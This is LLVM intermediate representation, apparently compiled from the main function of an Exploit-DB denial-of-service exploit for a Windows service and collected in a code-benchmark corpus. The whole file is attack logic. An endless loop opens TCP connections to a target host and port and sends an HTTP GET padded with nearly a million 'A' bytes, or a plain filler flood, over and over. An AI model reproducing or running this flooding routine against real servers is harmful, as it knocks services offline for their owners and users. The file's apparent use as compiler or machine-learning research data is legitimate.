; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_13888.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_13888.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32, i32, i64, i32, i64, i32, i32, i32 }
%struct.sockaddr_in = type { i32, %struct.TYPE_3__, i32 }
%struct.TYPE_3__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@TITLE = common dso_local global i8* null, align 8
@use = common dso_local global %struct.TYPE_4__ zeroinitializer, align 8
@AF_INET = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [27 x i8] c"[*]connection established\0A\00", align 1
@.str.2 = private unnamed_addr constant [21 x i8] c"[*]Sending packets!\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [8 x i8] c"line 81\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"get\00", align 1
@GET1 = common dso_local global i32 0, align 4
@GET2 = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [6 x i8] c"flood\00", align 1
@.str.6 = private unnamed_addr constant [30 x i8] c"Nr of connections:%d\0Aline 89:\00", align 1
@.str.7 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.8 = private unnamed_addr constant [22 x i8] c"Nr of sends:\0Aline 96:\00", align 1
@BUFFSZ = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %7 = load i8*, i8** @TITLE, align 8
  %8 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i8* %7)
  %9 = load i32, i32* %4, align 4
  %10 = load i8**, i8*** %5, align 8
  %11 = call i32 @get_arguments(i32 %9, i8** %10)
  store i32 12, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 0), align 8
  %12 = load i32, i32* @AF_INET, align 4
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  store i32 %12, i32* %13, align 4
  %14 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 7), align 8
  %15 = call i32 @inet_addr(i32 %14)
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  %17 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %16, i32 0, i32 0
  store i32 %15, i32* %17, align 4
  %18 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 6), align 4
  %19 = call i32 @htons(i32 %18)
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i32 %19, i32* %20, align 4
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0))
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0))
  br label %23

23:                                               ; preds = %91, %2
  %24 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 1), align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 1), align 4
  %26 = load i32, i32* @AF_INET, align 4
  %27 = load i32, i32* @SOCK_STREAM, align 4
  %28 = load i32, i32* @IPPROTO_TCP, align 4
  %29 = call i64 @socket(i32 %26, i32 %27, i32 %28)
  store i64 %29, i64* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 2), align 8
  %30 = load i64, i64* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 2), align 8
  %31 = icmp slt i64 %30, 0
  br i1 %31, label %32, label %35

32:                                               ; preds = %23
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0))
  %34 = call i32 (...) @error_handle()
  br label %35

35:                                               ; preds = %32, %23
  %36 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 5), align 8
  %37 = call i64 @strcmp(i32 %36, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0))
  %38 = icmp eq i64 %37, 0
  br i1 %38, label %39, label %51

39:                                               ; preds = %35
  %40 = load i64, i64* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 4), align 8
  %41 = load i32, i32* @GET1, align 4
  %42 = call i32 @copy_str(i64 %40, i32 %41, i32 5)
  %43 = load i64, i64* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 4), align 8
  %44 = add nsw i64 %43, 5
  %45 = call i32 @mset(i64 %44, i32 65, i32 999999)
  %46 = load i64, i64* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 4), align 8
  %47 = add nsw i64 %46, 5
  %48 = add nsw i64 %47, 999999
  %49 = load i32, i32* @GET2, align 4
  %50 = call i32 @copy_str(i64 %48, i32 %49, i32 17)
  br label %60

51:                                               ; preds = %35
  %52 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 5), align 8
  %53 = call i64 @strcmp(i32 %52, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i64 0, i64 0))
  %54 = icmp eq i64 %53, 0
  br i1 %54, label %55, label %59

55:                                               ; preds = %51
  %56 = load i64, i64* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 4), align 8
  %57 = add nsw i64 %56, 5
  %58 = call i32 @mset(i64 %57, i32 65, i32 999999)
  br label %59

59:                                               ; preds = %55, %51
  br label %60

60:                                               ; preds = %59, %39
  %61 = load i64, i64* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 2), align 8
  %62 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %63 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 0), align 8
  %64 = call i64 @connect(i64 %61, %struct.sockaddr* %62, i32 %63)
  %65 = icmp slt i64 %64, 0
  br i1 %65, label %66, label %70

66:                                               ; preds = %60
  %67 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 1), align 4
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.6, i64 0, i64 0), i32 %67)
  %69 = call i32 (...) @error_handle()
  br label %72

70:                                               ; preds = %60
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  br label %72

72:                                               ; preds = %70, %66
  %73 = load i64, i64* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 2), align 8
  %74 = load i64, i64* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 4), align 8
  %75 = call i64 @send(i64 %73, i64 %74, i32 8, i32 0)
  %76 = icmp slt i64 %75, 0
  br i1 %76, label %77, label %83

77:                                               ; preds = %72
  %78 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 1), align 4
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.8, i64 0, i64 0), i32 %78)
  %80 = call i32 (...) @error_handle()
  %81 = load i64, i64* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 2), align 8
  %82 = call i32 @shutdown(i64 %81, i32 1)
  br label %91

83:                                               ; preds = %72
  %84 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 3), align 8
  %85 = load i32, i32* @BUFFSZ, align 4
  %86 = call i32 @memset(i32 %84, i32 0, i32 %85)
  %87 = load i64, i64* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 2), align 8
  %88 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @use, i32 0, i32 3), align 8
  %89 = load i32, i32* @BUFFSZ, align 4
  %90 = call i32 @recv(i64 %87, i32 %88, i32 %89, i32 0)
  br label %91

91:                                               ; preds = %83, %77
  br label %23
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @get_arguments(i32, i8**) #1

declare dso_local i32 @inet_addr(i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i64 @socket(i32, i32, i32) #1

declare dso_local i32 @error_handle(...) #1

declare dso_local i64 @strcmp(i32, i8*) #1

declare dso_local i32 @copy_str(i64, i32, i32) #1

declare dso_local i32 @mset(i64, i32, i32) #1

declare dso_local i64 @connect(i64, %struct.sockaddr*, i32) #1

declare dso_local i64 @send(i64, i64, i32, i32) #1

declare dso_local i32 @shutdown(i64, i32) #1

declare dso_local i32 @memset(i32, i32, i32) #1

declare dso_local i32 @recv(i64, i32, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
